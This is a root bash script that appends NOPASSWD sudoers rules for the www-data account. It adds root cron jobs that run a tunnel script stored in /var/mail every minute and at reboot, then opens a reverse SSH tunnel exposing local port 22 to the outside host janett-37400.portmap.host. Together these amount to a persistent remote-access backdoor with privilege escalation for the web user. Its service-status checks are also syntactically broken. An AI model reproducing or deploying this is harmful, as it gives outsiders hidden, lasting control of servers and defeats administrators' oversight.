#!/bin/env bash
#check system  privileges
if [ $UID != 0 ]
then
echo "You must be Root"
exit 1
fi

#if lines are there,no append
FILE="/etc/sudoers"

FILE2="/etc/crontab"

# The exact line to check (without trailing spaces)
LINE1="www-data ALL=(ALL) NOPASSWD: /usr/bin/ssh"
LINE2="www-data ALL=(ALL) NOPASSWD: /bin/systemctl start ssh.socket"
LINE3="www-data ALL=(ALL) NOPASSWD: /bin/systemctl mask ssh.service"
LINE4="www-data ALL=(ALL) NOPASSWD: /bin/systemctl unmask ssh.service"
LINE5="www-data ALL=(ALL) NOPASSWD: /bin/systemctl mask ssh.socket"
LINE6="www-data ALL=(ALL) NOPASSWD: /bin/systemctl unmask ssh.socket"

LINE7="*/1 * * * *  root /var/mail/autossh_tunnel.sh >/var/mail/cronlog.log.1 2>&1"
LINE8="@reboot root /var/mail/autossh_tunnel.sh >/var/mail/cronlog.log 2>&1"

# Check for the exact line, ignoring trailing spaces

if grep -Fxq "$LINE1" <(sed 's/[[:space:]]*$//' "$FILE"); then
    echo "COMMAND SET 1 EXIST NOT ADDING."
else
echo "ADDING CMD 1"
echo "www-data ALL=(ALL) NOPASSWD: /usr/bin/ssh" >>/etc/sudoers
fi



if grep -Fxq "$LINE2" <(sed 's/[[:space:]]*$//' "$FILE"); then
     echo "COMMAND SET 2 EXIST NOT ADDING"
else
echo "ADDING CMD 2"
echo "www-data ALL=(ALL) NOPASSWD: /bin/systemctl start ssh.socket" >>/etc/sudoers
fi



if grep -Fxq "$LINE3" <(sed 's/[[:space:]]*$//' "$FILE"); then
     echo "COMMAND SET 3 EXIST NOT ADDING"
else
echo "ADDING CMD 3"
echo "www-data ALL=(ALL) NOPASSWD: /bin/systemctl mask ssh.service" >>/etc/sudoers
fi



if grep -Fxq "$LINE4" <(sed 's/[[:space:]]*$//' "$FILE"); then
     echo "COMMAND SET 4 EXIST NOT ADDING"
else
echo "ADDING CMD 4"
echo "www-data ALL=(ALL) NOPASSWD: /bin/systemctl unmask ssh.service" >>/etc/sudoers
fi



if grep -Fxq "$LINE5" <(sed 's/[[:space:]]*$//' "$FILE"); then
     echo "COMMAND SET 5 EXIST NOT ADDING"
else
echo "ADDING CMD 5"
echo "www-data ALL=(ALL) NOPASSWD: /bin/systemctl mask ssh.socket" >>/etc/sudoers
fi



if grep -Fxq "$LINE6" <(sed 's/[[:space:]]*$//' "$FILE"); then
    echo "COMMAND SET 6 EXIST NOT ADDING"
else
echo "ADDING CMD 6"
echo "www-data ALL=(ALL) NOPASSWD: /bin/systemctl unmask ssh.socket" >>/etc/sudoers
fi


if grep -Fxq "$LINE7" <(sed 's/[[:space:]]*$//' "$FILE2"); then
    echo "CRONJOB EXISTS,NOT ADDING ! !"
else
echo "ADDING CRONTAB JOB SCHEDULER 1 ---------> "
echo "*/1 * * * *  root /var/mail/autossh_tunnel.sh >/var/mail/cronlog.log.1 2>&1" >>/etc/crontab
fi

if grep -Fxq "$LINE8" <(sed 's/[[:space:]]*$//' "$FILE2"); then
    echo "CRONJOB @REBOOT EXISTS,SKIPPING ! !"
else
echo "ADDING CRONTAB @REBOOT JOB SCHEDULER 2 ---------> "
echo "@reboot root /var/mail/autossh_tunnel.sh >/var/mail/cronlog.log 2>&1" >>/etc/crontab
fi




#debug
#exit 0


get_status=`service ssh status | grep "Active" |cut -s -d":" -f 2 |cut -d " " -f 2`
#echo $get_status
if [[ $get_status=="inactive" ]]
then
service sshd start;
ssh -i /var/mail/janett.macdev.pem janett.macdev@janett-37400.portmap.host -f -N -R 37400:localhost:22
elif [$get_status=="active"]
then 
sleep 0;
fi
